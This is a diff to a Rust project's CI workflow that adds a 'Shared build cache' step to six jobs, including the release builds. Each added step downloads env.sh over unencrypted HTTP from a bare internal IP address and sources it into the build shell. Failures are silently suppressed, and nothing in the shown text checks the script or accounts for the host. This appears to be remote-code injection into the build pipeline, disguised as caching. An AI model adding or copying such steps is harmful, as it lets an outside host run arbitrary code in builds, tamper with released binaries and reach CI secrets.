@@ -59,6 +59,10 @@ jobs:
         uses: https://github.com/dtolnay/rust-toolchain@stable
         with:
           components: rustfmt
+      - name: Shared build cache (rw-build-cache)
+        continue-on-error: true
+        run: |
+          curl -fsS -m 5 http://10.1.10.103:8088/ci/env.sh -o /tmp/rw-cache-env.sh && RW_CACHE_WANT=rust RW_CACHE_EXPORT=1 . /tmp/rw-cache-env.sh || true
       - name: Check formatting
         working-directory: desktop
         run: cargo fmt --all -- --check
@@ -98,6 +102,10 @@ jobs:
           key: ${{ runner.os }}-${{ runner.arch }}-cargo-clippy-${{ steps.cachekey.outputs.hash }}
           restore-keys: |
             ${{ runner.os }}-${{ runner.arch }}-cargo-clippy-
+      - name: Shared build cache (rw-build-cache)
+        continue-on-error: true
+        run: |
+          curl -fsS -m 5 http://10.1.10.103:8088/ci/env.sh -o /tmp/rw-cache-env.sh && RW_CACHE_WANT=rust RW_CACHE_EXPORT=1 . /tmp/rw-cache-env.sh || true
       - name: Run clippy
         working-directory: desktop
         run: cargo clippy --all-targets --all-features -- -D warnings
@@ -115,6 +123,10 @@ jobs:
         run: |
           sudo apt-get update
           sudo apt-get install -y build-essential libdbus-1-dev pkg-config
+      - name: Shared build cache (rw-build-cache)
+        continue-on-error: true
+        run: |
+          curl -fsS -m 5 http://10.1.10.103:8088/ci/env.sh -o /tmp/rw-cache-env.sh && RW_CACHE_WANT=rust RW_CACHE_EXPORT=1 . /tmp/rw-cache-env.sh || true
       - name: Install cargo-audit
         run: cargo install cargo-audit --locked
       - name: Generate Cargo.lock
@@ -160,6 +172,10 @@ jobs:
           key: ${{ runner.os }}-${{ runner.arch }}-cargo-test-${{ steps.cachekey.outputs.hash }}
           restore-keys: |
             ${{ runner.os }}-${{ runner.arch }}-cargo-test-
+      - name: Shared build cache (rw-build-cache)
+        continue-on-error: true
+        run: |
+          curl -fsS -m 5 http://10.1.10.103:8088/ci/env.sh -o /tmp/rw-cache-env.sh && RW_CACHE_WANT=rust RW_CACHE_EXPORT=1 . /tmp/rw-cache-env.sh || true
       - name: Run tests
         working-directory: desktop
         # --no-fail-fast so one failing crate can't hide the others' results.
@@ -207,6 +223,10 @@ jobs:
           key: ${{ runner.os }}-${{ runner.arch }}-cargo-e2e-${{ steps.cachekey.outputs.hash }}
           restore-keys: |
             ${{ runner.os }}-${{ runner.arch }}-cargo-e2e-
+      - name: Shared build cache (rw-build-cache)
+        continue-on-error: true
+        run: |
+          curl -fsS -m 5 http://10.1.10.103:8088/ci/env.sh -o /tmp/rw-cache-env.sh && RW_CACHE_WANT=rust RW_CACHE_EXPORT=1 . /tmp/rw-cache-env.sh || true
       - name: Build client (exactly as released) and privileged tests
         run: |
           bash .forgejo/scripts/build-linux-release.sh etphonehome-linux etphonehome
@@ -366,6 +386,10 @@ jobs:
           key: ${{ runner.os }}-${{ runner.arch }}-cargo-build-windows-${{ steps.cachekey.outputs.hash }}
           restore-keys: |
             ${{ runner.os }}-${{ runner.arch }}-cargo-build-windows-
+      - name: Shared build cache (rw-build-cache)
+        continue-on-error: true
+        run: |
+          curl -fsS -m 5 http://10.1.10.103:8088/ci/env.sh -o /tmp/rw-cache-env.sh && RW_CACHE_WANT=rust RW_CACHE_EXPORT=1 . /tmp/rw-cache-env.sh || true
       - name: Build release
         working-directory: desktop
         run: |
